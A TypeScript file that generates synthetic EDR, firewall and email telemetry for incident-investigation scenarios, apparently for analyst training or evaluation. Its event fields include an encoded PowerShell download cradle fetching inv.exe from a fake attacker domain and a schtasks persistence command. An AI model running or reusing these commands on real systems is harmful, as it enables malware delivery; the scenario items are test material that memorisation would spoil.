        "threat.technique.subtechnique.id": "T1059.001",
        "crowdstrike.SeverityName": "High",
        "crowdstrike.DetectDescription": "Parent is a native-messaging host launched by a browser; Hidden window style; Base64-encoded command argument",
        "process.pid": "9024",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCmd}`,
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "9020",
        "user.name": "NEXACORP\\d.cohen",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_bext_04_beacon", ts: T(2 * MIN + 30_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { bytes_out: 3072, bytes_in: 40960, domain: c2Domain },
      description: "The firewall's URL filtering logged an alert for an HTTPS session from WS-MKT-3301 to cdn-assets-update.xyz, categorised as a newly registered domain; the session was allowed.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "53718",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
        "network.bytes_out": "3072", "network.bytes_in": "40960",
        "dns.query_domain": c2Domain,
        "url.category": "newly-registered-domain",
        "action_result": "allow",
      },
    },
    {
      // What the download cradle did before it was killed: wrote a second-stage script
      // to %TEMP%, giving the analyst the stage-2 artifact and hash.
      id: "evt_bext_04b_drop", ts: T(2 * MIN + 45_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1105",
      file: { path: "C:\\Users\\d.cohen\\AppData\\Local\\Temp\\b.ps1", sha256: stagerHash, size: 40960 },
      process: {
        name: "powershell.exe", pid: 9024, parent_name: "cmd.exe", parent_pid: 9020,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      description: "powershell.exe on WS-MKT-3301 wrote b.ps1 (40 KB) to d.cohen's %TEMP% folder.",
      raw: {
        "crowdstrike.event_simpleName": "NewScriptWritten",
        "file.path": "C:\\Users\\d.cohen\\AppData\\Local\\Temp\\b.ps1",
        "file.hash.sha256": stagerHash,
        "host.name": victim.hostname, "user.name": "NEXACORP\\d.cohen",
      },
    },
    {
      id: "evt_bext_05_detect", ts: T(4 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1059.001",
      // The detection is about the PowerShell process (pid 9024), not the extension JS file.
      process: {
        name: "powershell.exe", pid: 9024, parent_name: "cmd.exe", parent_pid: 9020,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmdline: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCmd}`,
        user: "NEXACORP\\d.cohen",
      },
      description: "The EDR terminated the encoded PowerShell process on WS-MKT-3301 that had been spawned through the browser native-messaging host.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.DetectName": "SuspiciousPowershellDownloadCradle",
        "crowdstrike.Tactic": "Execution",
        "threat.tactic.id": "TA0002",
        "crowdstrike.Technique": "Command and Scripting Interpreter: PowerShell",
        "threat.technique.id": "T1059",
        "threat.technique.subtechnique.id": "T1059.001",
        "crowdstrike.PatternDispositionValue": "2048",
        "crowdstrike.PatternDispositionDescription": "Prevention, process killed.",
        "crowdstrike.SeverityName": "Critical",
        "host.name": victim.hostname,
        "action_result": "process_killed",
      },
    },
  ];

  return { title: "Sideloaded Browser Extension → Native-Messaging Host → PowerShell", events, T, MIN, c2Domain, c2Ip, stagerHash, dlDomain, dlIp, zipHash };
}

/** Telemetry half of `buildTechSupportScamScenario`: the events and the story title, no answer key. */
export function techSupportScamScenarioEvents() {
  const B = new Date("2026-05-27T14:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-ACC-4477", email: "t.mizrahi@nexacorp.com", ip: "10.10.71.29" };
  const toolHash = makeSha256("anydesk_portable_binary_legit_signed");
  const relayIp = "188.34.183.60"; // AnyDesk relay (Hetzner range), outbound 443
  const relayHost = "relay-a7f3c1.net.anydesk.com";
  const scamSite = "ms-support-alert.live";
  const scamIp = "154.216.17.39";
  const peerId = "1 581 927 344"; // incoming AnyDesk ID of the caller
  const peerIp = "102.89.44.17";  // caller's internet IP (from the connection trace)

  const events: TelemetryEvent[] = [
    {
      // The lure: the scareware page the user was sent to, which told them to call and install AnyDesk.
      id: "evt_rat_00_lure", ts: T(-3 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "http_request",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: scamIp, dst_port: 443, protocol: "tcp",
      severity: "medium",
      network: { url: `https://${scamSite}/alert/call-support`, domain: scamSite, method: "GET" },
      description: `WS-ACC-4477 loaded ${scamSite}/alert/call-support, which the firewall categorises as a scam/potentially-malicious page.`,
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "51990",
        "destination.ip": scamIp, "destination.port": "443",
        "network.application": "ssl", "pan.app": "web-browsing", "pan.action": "alert",
        "url.full": `https://${scamSite}/alert/call-support`,
        "url.category": "scam",
        "action_result": "allow",
      },
    },
    {
      id: "evt_rat_01_download", ts: T(0),
      source: "edr", vendor: "SentinelOne", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "low",
      file: { path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe", sha256: toolHash, size: 4192256 },
      // The browser wrote the download — chrome.exe is the actor of the file-create.
      process: {
        name: "chrome.exe", pid: 4120, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        user: "NEXACORP\\t.mizrahi", integrity: "medium",
      },
      description: "AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to t.mizrahi's Downloads folder on WS-ACC-4477.",
      raw: {
        "s1.eventType": "File Creation",
        "file.path": "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        "file.hash.sha256": toolHash,
        "file.code_signature.exists": true, "file.code_signature.trusted": true,
        "file.code_signature.subject_name": "philandro Software GmbH",
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_rat_02_execute", ts: T(4 * MIN),
      source: "edr", vendor: "SentinelOne", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1219.002",
      description: "t.mizrahi launched AnyDesk.exe on WS-ACC-4477; explorer.exe was the parent process.",
      process: {
        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        cmdline: "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
        user: "NEXACORP\\t.mizrahi", integrity: "medium",
        hash: { sha256: toolHash },
      },
      raw: {
        "s1.eventType": "Process Creation",
        "s1.mitigation_status": "not_mitigated",
        "process.name": "AnyDesk.exe",
        "process.pid": "5212",
        "process.executable": "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        "process.command_line": "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
        "process.parent.name": "explorer.exe",
        "process.hash.sha256": toolHash,
        "process.code_signature.exists": true, "process.code_signature.trusted": true,
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
        "action_result": "allowed",
      },
    },
    {
      id: "evt_rat_03_relay", ts: T(4 * MIN + 40_000),
      source: "edr", vendor: "SentinelOne", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: relayIp, dst_port: 443, src_port: 52118, protocol: "tcp",
      severity: "medium", mitre_technique: "T1219.002",
      network: { domain: relayHost, bytes_out: 81920, bytes_in: 614400 },
      description: `AnyDesk.exe on WS-ACC-4477 opened an outbound session to an AnyDesk relay (${relayHost}).`,
      process: {
        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        cmdline: "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
        user: "NEXACORP\\t.mizrahi", hash: { sha256: toolHash },
      },
      raw: {
        "s1.eventType": "IP Connect",
        "process.name": "AnyDesk.exe",
        "process.pid": "5212",
        "process.hash.sha256": toolHash,
        "source.ip": victim.ip, "source.port": "52118",
        "destination.ip": relayIp, "destination.port": "443",
        "destination.domain": relayHost,
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.direction": "outbound",
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
        "action_result": "allowed",
      },
    },
    {
      // The AnyDesk trace file names the incoming session's ID and the remote peer's IP —
      // the only record that identifies the caller.
      id: "evt_rat_03b_trace", ts: T(4 * MIN + 55_000),
      source: "edr", vendor: "SentinelOne", event_type: "file_modify",
      hostname: victim.hostname, user_email: victim.email,
      severity: "medium", mitre_technique: "T1219.002",
      file: { path: "C:\\Users\\t.mizrahi\\AppData\\Roaming\\AnyDesk\\connection_trace.txt", size: 2048 },
      process: {
        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        user: "NEXACORP\\t.mizrahi", hash: { sha256: toolHash },
      },
      description: `AnyDesk recorded an incoming interactive session (ID ${peerId}, remote address ${peerIp}) in its connection_trace.txt on WS-ACC-4477.`,
      raw: {
        "s1.eventType": "File Modification",
        "file.path": "C:\\Users\\t.mizrahi\\AppData\\Roaming\\AnyDesk\\connection_trace.txt",
        "process.name": "AnyDesk.exe",
        "process.hash.sha256": toolHash,
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_rat_04_shell", ts: T(4 * MIN + 90_000),
      source: "edr", vendor: "SentinelOne", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "medium", mitre_technique: "T1059.003",
      description: "While the AnyDesk session was live, explorer.exe on WS-ACC-4477 started cmd.exe, which ran systeminfo and netstat.",
      process: {
        name: "cmd.exe", pid: 5540, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "cmd.exe /c systeminfo & netstat -ano",
        user: "NEXACORP\\t.mizrahi", integrity: "medium",
      },
      raw: {
        "s1.eventType": "Process Creation",
        "process.name": "cmd.exe",
        "process.pid": "5540",
        "process.command_line": "cmd.exe /c systeminfo & netstat -ano",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3140",
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
      },
    },
    {
      // Post-session action: the operator installs AnyDesk as a service for unattended access.
      id: "evt_rat_04b_install", ts: T(5 * MIN + 40_000),
      source: "edr", vendor: "SentinelOne", event_type: "service_install",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1543.003",
      description: "AnyDesk was installed as a Windows service (AnyDesk) on WS-ACC-4477, which keeps it running for unattended access after the user logs off.",
      process: {
        name: "AnyDesk.exe", pid: 6020, parent_name: "services.exe", parent_pid: 836,
        path: "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
        user: "NT AUTHORITY\\SYSTEM", integrity: "system", hash: { sha256: toolHash },
      },
      raw: {
        "s1.eventType": "Service Installation",
        "service.name": "AnyDesk",
        "service.start_type": "2",
        "service.account": "LocalSystem",
        "process.name": "AnyDesk.exe",
        "process.executable": "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
        "process.hash.sha256": toolHash,
        "process.parent.name": "services.exe",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_rat_05_detect", ts: T(6 * MIN),
      source: "edr", vendor: "SentinelOne", event_type: "edr_alert",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1219.002",
      is_detection: true,
      file: { path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe", sha256: toolHash, size: 4192256 },
      process: {
        name: "AnyDesk.exe", pid: 5212, parent_name: "explorer.exe", parent_pid: 3140,
        path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        user: "NEXACORP\\t.mizrahi", hash: { sha256: toolHash },
      },
      description: "SentinelOne raised a behavioural alert for an unsanctioned remote-access tool (AnyDesk) with a live external relay session on WS-ACC-4477 and terminated its processes.",
      raw: {
        "s1.eventType": "Threats",
        "s1.detection.classification": "PUA",
        "s1.detection.classification_source": "Behavioral Engine",
        "s1.mitigation_status": "mitigated",
        "threat.name": "PUA.RemoteAdmin.AnyDesk",
        "s1.threat.id": "TH-441-2026",
        "process.name": "AnyDesk.exe",
        "process.hash.sha256": toolHash,
        "file.path": "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        "file.hash.sha256": toolHash,
        "host.name": victim.hostname,
        "action_result": "process_killed",
      },
    },
  ];

  return { title: "Tech-Support Scam → Unapproved Remote Access Tool", events, T, MIN, toolHash, scamSite, scamIp, relayHost, relayIp, peerId };
}

/** Telemetry half of `buildCrackedSoftwareScenario`: the events and the story title, no answer key. */
export function crackedSoftwareScenarioEvents() {
  const B = new Date("2026-05-29T20:10:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-ENG-2093", email: "y.golan@nexacorp.com", ip: "10.10.48.55" };
  const downloadDomain = "fast-office-tools-download.top";
  // Story-specific infrastructure (no other storyline uses these addresses).
  const downloadIp = "103.224.182.47";
  const c2Domain = "office-license-check.info";
  const c2Ip = "45.95.147.62";
  const installerHash = makeSha256("office_activator_setup_installer");
  const payloadHash = makeSha256("cracked_installer_dropped_payload");
  const installerPath = "C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe";
  const svchelperPath = "C:\\ProgramData\\OfficeTools\\svchelper.exe";

  const events: TelemetryEvent[] = [
    {
      id: "evt_crack_01_download", ts: T(0),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "http_request",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: downloadIp, dst_port: 443, protocol: "tcp",
      severity: "low",
      network: { url: `https://${downloadDomain}/dl/Office_Pro_2026_Activator_Setup.exe`, domain: downloadDomain, method: "GET", bytes_out: 2048, bytes_in: 18874368 },
      file: { name: "Office_Pro_2026_Activator_Setup.exe", path: "Office_Pro_2026_Activator_Setup.exe", sha256: installerHash, size: 18874368 },
      description: "WS-ENG-2093 downloaded Office_Pro_2026_Activator_Setup.exe (Windows executable) over HTTPS from fast-office-tools-download.top at 20:10.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "58122",
        "destination.ip": downloadIp, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
        "url.full": `https://${downloadDomain}/dl/Office_Pro_2026_Activator_Setup.exe`,
        "pan.filename": "Office_Pro_2026_Activator_Setup.exe",
        "url.category": "questionable",
        "action_result": "allow",
      },
    },
    {
      id: "evt_crack_01b_save", ts: T(30_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1204.002",
      file: { path: installerPath, sha256: installerHash, size: 18874368 },
      process: {
        name: "chrome.exe", pid: 4120, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        user: "NEXACORP\\y.golan", integrity: "medium",
      },
      description: "chrome.exe on WS-ENG-2093 saved Office_Pro_2026_Activator_Setup.exe to y.golan's Downloads folder.",
      raw: {
        "ActionType": "FileCreated",
        "FileName": "Office_Pro_2026_Activator_Setup.exe",
        "FolderPath": installerPath,
        "SHA256": installerHash,
        "FileOriginUrl": `https://${downloadDomain}/dl/Office_Pro_2026_Activator_Setup.exe`,
        "FileOriginReferrerUrl": `https://${downloadDomain}/office-activator`,
        "InitiatingProcessFileName": "chrome.exe",
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "ReportId": "889210",
      },
    },
    {
      id: "evt_crack_02_execute", ts: T(6 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1204.002",
      description: "y.golan ran Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 with explorer.exe as the parent process; the binary is unsigned.",
      process: {
        name: "Office_Pro_2026_Activator_Setup.exe", pid: 6120, parent_name: "explorer.exe", parent_pid: 3140,
        path: installerPath,
        cmdline: `"${installerPath}"`,
        user: "NEXACORP\\y.golan", integrity: "medium",
        hash: { sha256: installerHash },
      },
      raw: {
        "Timestamp": T(6 * MIN),
        "ActionType": "ProcessCreated",
        "FileName": "Office_Pro_2026_Activator_Setup.exe",
        "FolderPath": installerPath,
        "SHA256": installerHash,
        "ProcessId": "6120",
        "ProcessCommandLine": `"${installerPath}"`,
        "ProcessIntegrityLevel": "Medium",
        "SignatureStatus": "Unsigned",
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessId": "3140",
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "AttackTechniques": ["T1204.002"],
        "ReportId": "889213",
      },
    },
    {
      id: "evt_crack_02b_drop", ts: T(6 * MIN + 15_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "medium", mitre_technique: "T1204.002",
      file: { path: svchelperPath, sha256: payloadHash, size: 512000 },
      process: {
        name: "Office_Pro_2026_Activator_Setup.exe", pid: 6120, parent_name: "explorer.exe", parent_pid: 3140,
        path: installerPath, user: "NEXACORP\\y.golan", integrity: "medium", hash: { sha256: installerHash },
      },
      description: "Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 wrote svchelper.exe to C:\\ProgramData\\OfficeTools\\.",
      raw: {
        "ActionType": "FileCreated",
        "FileName": "svchelper.exe",
        "FolderPath": svchelperPath,
        "SHA256": payloadHash,
        "InitiatingProcessFileName": "Office_Pro_2026_Activator_Setup.exe",
        "InitiatingProcessFolderPath": installerPath,
        "InitiatingProcessSHA256": installerHash,
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "ReportId": "889214",
      },
    },
    {
      id: "evt_crack_03_persist", ts: T(6 * MIN + 40_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1053.005",
      // The installer runs as a Medium-integrity user, so it registers the task to run as
      // that user (no /ru SYSTEM — that would need admin and fail "Access is denied").
      description: "Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 ran schtasks.exe to register a task named OfficeLicenseRefresh that launches C:\\ProgramData\\OfficeTools\\svchelper.exe every 30 minutes and at logon.",
      process: {
        name: "schtasks.exe", pid: 6456, parent_name: "Office_Pro_2026_Activator_Setup.exe", parent_pid: 6120,
        path: "C:\\Windows\\System32\\schtasks.exe",
        cmdline: `schtasks.exe /create /tn "OfficeLicenseRefresh" /tr "${svchelperPath}" /sc minute /mo 30 /f`,
        user: "NEXACORP\\y.golan", integrity: "medium",
      },
      raw: {
        "Timestamp": T(6 * MIN + 40_000),
        "ActionType": "ProcessCreated",
        "FileName": "schtasks.exe",
        "FolderPath": "C:\\Windows\\System32\\schtasks.exe",
        "ProcessId": "6456",
        "ProcessCommandLine": `schtasks.exe /create /tn "OfficeLicenseRefresh" /tr "${svchelperPath}" /sc minute /mo 30 /f`,
        "ProcessIntegrityLevel": "Medium",
        "InitiatingProcessFileName": "Office_Pro_2026_Activator_Setup.exe",
        "InitiatingProcessId": "6120",
        "InitiatingProcessFolderPath": installerPath,
        "InitiatingProcessSHA256": installerHash,
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "AttackTechniques": ["T1053.005"],
        "ReportId": "889215",
      },
    },
    {
      id: "evt_crack_04_taskrun", ts: T(7 * MIN + 30_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1053.005",
      // The task runs as the registering user (y.golan, Medium) — Task Scheduler is the parent.
      description: "The OfficeLicenseRefresh task fired on WS-ENG-2093: svchelper.exe was launched by the Windows Task Scheduler service host under y.golan.",
      process: {
        name: "svchelper.exe", pid: 7020, parent_name: "svchost.exe", parent_pid: 1136,
        path: svchelperPath,
        cmdline: `"${svchelperPath}"`,
        user: "NEXACORP\\y.golan", integrity: "medium",
        hash: { sha256: payloadHash },
      },
      raw: {
        "Timestamp": T(7 * MIN + 30_000),
        "ActionType": "ProcessCreated",
        "FileName": "svchelper.exe",
        "FolderPath": svchelperPath,
        "SHA256": payloadHash,
        "ProcessId": "7020",
        "ProcessCommandLine": `"${svchelperPath}"`,
        "ProcessIntegrityLevel": "Medium",
        "SignatureStatus": "Unsigned",
        "InitiatingProcessFileName": "svchost.exe",
        "InitiatingProcessId": "1136",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\svchost.exe",
        "InitiatingProcessCommandLine": "svchost.exe -k netsvcs -p -s Schedule",
        "InitiatingProcessAccountName": "system",
        "InitiatingProcessAccountDomain": "nt authority",
        "AccountName": "y.golan",
        "AccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "AttackTechniques": ["T1053.005"],
        "ReportId": "889216",
      },
    },
    {
      // Impact: the payload calls out to its C2 — gives the analyst a network indicator and a reason
      // to treat the host's stored credentials as exposed.
      id: "evt_crack_04b_c2", ts: T(7 * MIN + 45_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 52660, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { domain: c2Domain },
      process: {
        name: "svchelper.exe", pid: 7020, parent_name: "svchost.exe", parent_pid: 1136,
        path: svchelperPath, user: "NEXACORP\\y.golan", integrity: "medium", hash: { sha256: payloadHash },
      },
      description: `svchelper.exe on WS-ENG-2093 connected to ${c2Domain} (${c2Ip}) on port 443.`,
      raw: {
        "ActionType": "ConnectionSuccess",
        "RemoteIP": c2Ip, "RemotePort": "443", "RemoteUrl": c2Domain,
        "LocalIP": victim.ip, "LocalPort": "52660",
        "InitiatingProcessFileName": "svchelper.exe",
        "InitiatingProcessFolderPath": svchelperPath,
        "InitiatingProcessSHA256": payloadHash,
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "ReportId": "889217",
      },
    },
    {
      id: "evt_crack_05_detect", ts: T(9 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1053.005",
      file: { path: svchelperPath, sha256: payloadHash, size: 512000 },
      description: "Microsoft Defender quarantined svchelper.exe on WS-ENG-2093 and killed the running payload; the OfficeLicenseRefresh scheduled task is not recorded as removed.",
      raw: {
        "Timestamp": T(9 * MIN),
        "ActionType": "AntivirusDetection",
        "ThreatName": "Trojan:Win32/Wacatac.B!ml",
        "FileName": "svchelper.exe",
        "FolderPath": svchelperPath,
        "SHA256": payloadHash,
        "DeviceName": victim.hostname,
        "action_result": "quarantined",
      },
    },
  ];

  return { title: "Cracked Software Installer → Scheduled Task Persistence", events, T, MIN, downloadDomain, downloadIp, c2Domain, c2Ip, installerHash, payloadHash };
}

/** Telemetry half of `buildMaliciousMacroScenario`: the events and the story title, no answer key. */
export function maliciousMacroScenarioEvents() {
  const B = new Date("2026-06-01T11:20:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-SALES-1876", email: "s.peretz@nexacorp.com", ip: "10.10.33.91" };
  const c2Domain = "invoice-sync-cdn.xyz";
  // Story-specific infrastructure (no other storyline uses these addresses).
  const c2Ip = "23.137.249.140";
  const senderIp = "5.181.80.66";
  const msgId = "<a41c07e2.9d3f.4b8e@client-invoices-portal.info>";
  const docmHash = makeSha256("q3_client_invoice_review_docm_donoff");
  const invHash = makeSha256("macro_stage2_inv_exe_payload");
  const docmPath = "C:\\Users\\s.peretz\\Downloads\\Q3_Client_Invoice_Review.docm";

  const events: TelemetryEvent[] = [
    {
      // Delivered clean: Safe Attachments had no verdict at delivery time; the
      // Malware ZAP row below convicts the same message later (MDO never
      // delivers a Malware verdict).
      id: "evt_macro_01_email", ts: T(0),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, src_ip: senderIp,
      severity: "medium", mitre_technique: "T1566.001",
      description: "s.peretz received an email with a macro-enabled Word attachment (Q3_Client_Invoice_Review.docm) from an external sender; SPF, DKIM and DMARC all failed and the message was delivered to the inbox.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "InternetMessageId": msgId,
        "email.from.address": "billing@client-invoices-portal.info",
        "email.to.address": victim.email,
        "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
        "email.attachments.file.name": "Q3_Client_Invoice_Review.docm",
        "email.attachments.file.hash.sha256": docmHash,
        "email.attachments.file.size": 48210,
        "email.direction": "inbound",
        "source.ip": senderIp,
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        "action_result": "delivered",
      },
    },
    {
      // The attachment row of the same message — the docm's SHA256 lives here,
      // not in EmailEvents; it is the pivot to the file on the endpoint.
      id: "evt_macro_01b_attachment", ts: T(0),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email,
      severity: "informational", mitre_technique: "T1566.001",
      description: "The message's attachment record lists Q3_Client_Invoice_Review.docm (48,210 bytes) with its SHA256.",
      raw: {
        "category": "AdvancedHunting-EmailAttachmentInfo",
        "InternetMessageId": msgId,
        "email.from.address": "billing@client-invoices-portal.info",
        "email.to.address": victim.email,
        "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
        "email.attachments.file.name": "Q3_Client_Invoice_Review.docm",
        "email.attachments.file.hash.sha256": docmHash,
        "email.attachments.file.size": 48210,
        "email.direction": "inbound",
        "source.ip": senderIp,
        "action_result": "delivered",
      },
    },
    {
      id: "evt_macro_02_powershell", ts: T(8 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001",
      description: "s.peretz opened Q3_Client_Invoice_Review.docm and enabled content; WINWORD.EXE on WS-SALES-1876 then spawned powershell.exe with a hidden window and an encoded command.",
      process: {
        name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
        cmdline: "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AaQBuAHYAbwBpAGMAZQAtAHMAeQBuAGMALQBjAGQAbgAuAHgAeQB6AC8AaQBuAHYALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAaQBuAHYALgBlAHgAZQA=",
        user: "NEXACORP\\s.peretz", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "process.pid": "7340",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AaQBuAHYAbwBpAGMAZQAtAHMAeQBuAGMALQBjAGQAbgAuAHgAeQB6AC8AaQBuAHYALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAaQBuAHYALgBlAHgAZQA=",
        "process.parent.name": "WINWORD.EXE",
        "process.parent.pid": "4512",
        "user.name": "NEXACORP\\s.peretz",
        "host.name": victim.hostname,
      },
    },
    {
      // The first page: the EDR's behavioural alert on the Word → PowerShell
      // chain, seconds after the process started (detect-only on this host group).
      id: "evt_macro_02b_alert", ts: T(8 * MIN + 6_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "edr_alert",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001", mitre_tactic: "Execution",
      is_detection: true,
